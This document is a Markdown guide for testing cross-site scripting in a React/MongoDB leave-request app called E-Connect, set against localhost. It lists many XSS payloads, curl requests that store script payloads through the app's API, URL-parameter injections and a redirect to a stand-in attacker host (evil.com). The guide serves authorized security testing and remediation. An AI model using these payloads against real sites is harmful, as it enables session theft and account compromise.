# Comprehensive XSS Testing Guide for E-Connect

## Current Status
✅ **Good News**: The basic `<script>alert('XSS')</script>` payload is NOT reflecting in the UI, which suggests some level of protection is in place.

## Why Your Basic Payload Didn't Work

1. **React's Built-in Protection**: React automatically escapes HTML content when using JSX expressions like `{reason}`, converting `<` to `&lt;` and `>` to `&gt;`
2. **Input Sanitization**: There might be additional sanitization on frontend or backend
3. **Content Security Policy**: The browser might be blocking inline scripts

## Advanced XSS Testing Techniques

### Phase 1: Confirm React's Auto-Escaping
First, let's verify React is escaping your input:

1. **Submit Test Payload**:
   ```
   <h1>Test HTML</h1>
   ```

2. **Check Browser Developer Tools**:
   - Open F12 → Elements tab
   - Find where your reason text displays
   - If you see `&lt;h1&gt;Test HTML&lt;/h1&gt;` in the DOM, React is escaping it

### Phase 2: Test Different Attack Vectors

#### 2.1 Event Handler Payloads
Try these in the reason field:

```javascript
" onmouseover="alert('XSS')"
' onmouseover='alert("XSS")'
onload="alert('XSS')"
onfocus="alert('XSS')"
onerror="alert('XSS')"
```

#### 2.2 URL-based Payloads
```javascript
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

#### 2.3 Encoded Payloads
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;
<svg onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
```

#### 2.4 Case Variation Payloads
```javascript
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</ScRiPt>
```

#### 2.5 Unicode and Special Characters
```javascript
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### Phase 3: Test All Input Fields

Test these payloads in:
- ✅ Leave Request Reason field
- ✅ Other Leave Reason field  
- ✅ Bonus Leave Reason field
- ✅ Employee Name field (if editable)
- ✅ Any other text inputs

### Phase 4: Backend API Testing

#### 4.1 Direct API Testing with Curl/Postman

Test the API endpoints directly:

```bash
# Test Leave Request API
curl -X POST http://localhost:8000/leave-request \
  -H "Content-Type: application/json" \
  -d '{
    "userid": "test123",
    "employeeName": "<script>alert(\"XSS\")</script>",
    "leaveType": "Sick Leave",
    "selectedDate": "2024-01-15",
    "requestDate": "2024-01-14",
    "reason": "<script>alert(\"API XSS\")</script>"
  }'

# Test Permission Request API  
curl -X POST http://localhost:8000/Permission-request \
  -H "Content-Type: application/json" \
  -d '{
    "userid": "test123",
    "employeeName": "<img src=x onerror=alert(\"XSS\")>",
    "leaveType": "Permission",
    "selectedDate": "2024-01-15",
    "requestDate": "2024-01-14", 
    "timeSlot": "Forenoon",
    "reason": "<svg onload=alert(\"Permission XSS\")>"
  }'
```

#### 4.2 Check Database Storage
After submitting XSS payloads, check if they're stored in MongoDB:

```python
# Run this in Python terminal in backend directory
from Mongo import *
import pymongo

# Get recent leave requests
db = client["Attendancetracking"]
collection = db["LeaveRequest"]
recent_requests = collection.find().sort("_id", -1).limit(5)

for request in recent_requests:
    print(f"Reason: {request.get('reason', '')}")
    print(f"Employee Name: {request.get('employeeName', '')}")
    print("---")
```

### Phase 5: Admin Panel Testing

Test if XSS payloads execute when viewed in admin panels:

1. **Submit Leave Request** with XSS payload
2. **Login as Admin** 
3. **Navigate to Leave Approval page** (`/Admin/Leave_approval`)
4. **Check if script executes** when admin views the request

### Phase 6: Reflected XSS in URLs

Test URL parameters for XSS:

```
http://localhost:3000/User/Leaverequest?test=<script>alert('URL XSS')</script>
http://localhost:3000/Admin/Leave_approval?search=<img src=x onerror=alert('XSS')>
```

### Phase 7: Browser-Specific Testing

Test in different browsers:
- Chrome (strict XSS protection)
- Firefox (different security model)
- Edge
- Safari (if available)

### Phase 8: Network Inspection

1. **Open Browser DevTools** (F12)
2. **Go to Network tab**
3. **Submit form with XSS payload**
4. **Check request/response**:
   - Is payload being sent to server?
   - Is payload being returned from server?
   - Any encoding/decoding happening?

## Step-by-Step Testing Procedure

### Test 1: Basic HTML Injection
1. Go to Leave Request form
2. Select "Sick Leave"
3. Pick any date
4. In reason field, enter: `<h1>HTML Test</h1>`
5. Submit and check if HTML renders or is escaped

### Test 2: SVG-based XSS
1. In reason field, enter: `<svg onload=alert('SVG XSS')>`
2. Submit form
3. Check both form display and admin approval page

### Test 3: Image-based XSS  
1. In reason field, enter: `<img src=x onerror=alert('IMG XSS')>`
2. Submit form
3. Monitor for JavaScript execution

### Test 4: Event Handler XSS
1. In reason field, enter: `" onmouseover="alert('Event XSS')"`
2. Submit form
3. Hover over the displayed text

### Test 5: DOM-based XSS
1. Check if any JavaScript processes user input
2. Look for `innerHTML`, `document.write`, `eval()` usage
3. Test with payloads like: `<script>document.location='http://evil.com'</script>`

## What to Look For

### Signs of Successful XSS:
- ✅ JavaScript alert box appears
- ✅ Console errors about blocked scripts
- ✅ Unexpected HTML rendering
- ✅ Network requests to external domains
- ✅ Cookies being stolen/manipulated

### Signs of Protection:
- ✅ Payloads displayed as plain text
- ✅ HTML entities (&lt; &gt; &amp;)
- ✅ CSP violations in console
- ✅ Scripts not executing

## Remediation Testing

After developers fix XSS vulnerabilities, retest with:

1. **All previous payloads**
2. **New bypass techniques**
3. **Edge cases and special characters**
4. **Different encodings**

## Security Best Practices to Verify

1. **Input Validation**: Check if dangerous characters are rejected
2. **Output Encoding**: Verify HTML entities are used
3. **CSP Headers**: Check for Content-Security-Policy
4. **HttpOnly Cookies**: Ensure session cookies can't be accessed via JavaScript

## Tools for Advanced Testing

1. **Burp Suite**: For automated XSS scanning
2. **OWASP ZAP**: Free security testing proxy
3. **XSStrike**: Command-line XSS detection tool
4. **Browser Extensions**: XSS Me, XSS Hunter

Remember: The fact that your basic payload didn't work is actually good - it means there's some protection in place. Continue with more advanced techniques to thoroughly test the application's security posture.
